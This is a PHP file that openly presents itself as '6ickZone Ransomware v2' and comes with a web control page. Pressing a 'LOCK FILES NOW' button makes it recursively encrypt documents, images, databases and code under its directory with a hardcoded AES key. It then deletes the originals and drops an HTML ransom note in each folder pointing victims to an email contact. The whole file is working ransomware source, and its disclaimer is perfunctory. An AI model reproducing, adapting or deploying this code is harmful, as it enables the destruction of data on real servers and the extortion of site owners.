<?php
// 6ickZone Ransomware v2 - Obfuscated Light Version
set_time_limit(0);
error_reporting(0);

// --- Configuration ---
$_6 = "scarletdablackrose"; // NOTE: $key → $_6
$_c = ".6ick";              // NOTE: $newExtension → $_c
$_k = "!!!DECRYPT_ME!!!.html"; // NOTE: $ransomNoteFilename → $_k

// Files/folders to exclude
$_z = [ // NOTE: $excludeList → $_z
    basename(__FILE__),
    'decrypt.php',
    $_k,
    '.htaccess',
    '.user.ini',
    'web.config',
    'php.ini',
    'index.php',
    'error_log',
    'access_log',
    'logs',
    '.git',
    '.vscode',
    'vendor',
    'node_modules',
    'composer.json',
    'package.json',
];

// Target extensions to encrypt
$_o = [ // NOTE: $targetExtensions → $_o
    'txt', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf',
    'jpg', 'jpeg', 'png', 'gif', 'mp3', 'mp4', 'avi', 'mov',
    'zip', 'rar', '7z', 'sql', 'db', 'mdb', 'accdb', 'psd',
    'ai', 'html', 'svg', 'php', 'js', 'css', 'json', 'xml', 'csv',
];

// Counter for encrypted files
$_i = 0; // NOTE: $encryptedFilesCount → $_i

function encryptFile($filePath, $encryptionKey, $newExtension) {
    global $_i;

    $data = file_get_contents($filePath);
    if ($data === false) return false;

    $header_len = strlen("6ickZone:");
    if (substr($data, 0, $header_len) === "6ickZone:") {
        return false;
    }

    $iv = openssl_random_pseudo_bytes(16);
    $encryptedData = openssl_encrypt($data, 'AES-128-CBC', $encryptionKey, OPENSSL_RAW_DATA, $iv);
    if ($encryptedData === false) return false;

    $finalData = "6ickZone:" . base64_encode($iv . $encryptedData);

    if (file_put_contents($filePath . $newExtension, $finalData) === false) {
        return false;
    }

    if (!unlink($filePath)) {
        return false;
    }

    $_i++;
    return true;
}

function dropRansomNote($directory, $encryptionKey, $noteFilename) {
    $_n = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>!!! FILES ENCRYPTED !!!</title><style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;text-align:center;padding:50px;}h1{color:#f00;}p{margin:20px 0;}code{background:#333;padding:2px 5px;border-radius:3px;}.key-info{border:1px solid #0f0;padding:15px;display:inline-block;margin-top:30px;}</style></head><body><h1>!!! ALL YOUR FILES HAVE BEEN ENCRYPTED BY 6ickZone RANSOMWARE !!!</h1><p>Your important documents, photos, databases, and other files are now inaccessible.</p><p>To restore your data, you need the decryption key.</p><div class='key-info'><p>Your Decryption Key:</p>????<strong>LoL.</strong></p></div><p>Contact us at 6ickwhispers@gmail.com for further instructions.</p><p>Warning: Attempting to decrypt without the correct key may corrupt your files permanently.</p></body></html>";
    // NOTE: $noteContent → $_n
    file_put_contents($directory . DIRECTORY_SEPARATOR . $noteFilename, $_n);
}

function scanAndEncryptRecursive($dir, $encryptionKey, $excludeList, $targetExtensions, $newExtension, $ransomNoteFilename) {
    global $_i;

    dropRansomNote($dir, $encryptionKey, $ransomNoteFilename);

    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $path = $dir . DIRECTORY_SEPARATOR . $item;

        if (in_array($item, $excludeList)) continue;

        if (is_dir($path)) {
            scanAndEncryptRecursive($path, $encryptionKey, $excludeList, $targetExtensions, $newExtension, $ransomNoteFilename);
        } elseif (is_file($path)) {
            if (pathinfo($path, PATHINFO_EXTENSION) === trim($newExtension, '.')) continue;

            if (!empty($targetExtensions)) {
                $file_ext = pathinfo($path, PATHINFO_EXTENSION);
                if (!in_array($file_ext, $targetExtensions)) continue;
            }

            encryptFile($path, $encryptionKey, $newExtension);
        }
    }
}

// Main logic
$_e = false; // NOTE: $operation_status → $_e
if (isset($_POST['lock'])) {
    $_e = true;
    scanAndEncryptRecursive(__DIR__, $_6, $_z, $_o, $_c, $_k);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>6ickZone Ransomware (v2) - Fixed</title>
    <style>
        body {
            background: #0d0d0d;
            color: #eee;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 50px;
        }
        h1 {
            color: #f44336;
        }
        button {
            background: #f44336;
            border: none;
            padding: 15px 30px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background: #c62828;
        }
        .info {
            margin-top: 20px;
            font-size: 18px;
        }
        .footer {
            margin-top: 50px;
            font-size: 14px;
            color: #777;
        }
        code {
            background: #333;
            padding: 2px 6px;
            border-radius: 4px;
        }
        .warning {
            color: #ffeb3b;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .key-display {
            background: #222;
            padding: 15px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>6ickZone Ransomware (v2)</h1>
    <p class="warning">
        Illegal Usage:
Using ransomware tools without explicit authorization is illegal and considered a cybercrime.<br />
        Use at your own risk.!<br />
        The creator holds no responsibility for any consequences arising from misuse.
    </p>

    <?php if (!$_e): ?>
    <p>Auto scan & encrypt all target files in this directory and its subfolders.</p>
    <form method="post">
        <button type="submit" name="lock">LOCK FILES NOW</button>
    </form>
<?php else: ?>
    <div class="info">
        <p>Done! Total file terenkripsi: <strong><?php echo $_i; ?></strong></p>
        <p>Encrypted files now have the extension <code><?php echo htmlspecialchars($_c); ?></code>.</p>
        <p>Check each folder to find the file <code><?php echo htmlspecialchars($_k); ?></code>.</p>
        <div class="key-display">
            <p>Key for Decryption (PLEASE NOTE CAREFULLY FOR DECRYPTION):</p>
            <code><?php echo htmlspecialchars($_6); ?></code>
        </div>
    </div>
<?php endif; ?>

    <div class="footer">by 0x6ick - 6ickZone</div>
</body>
</html>
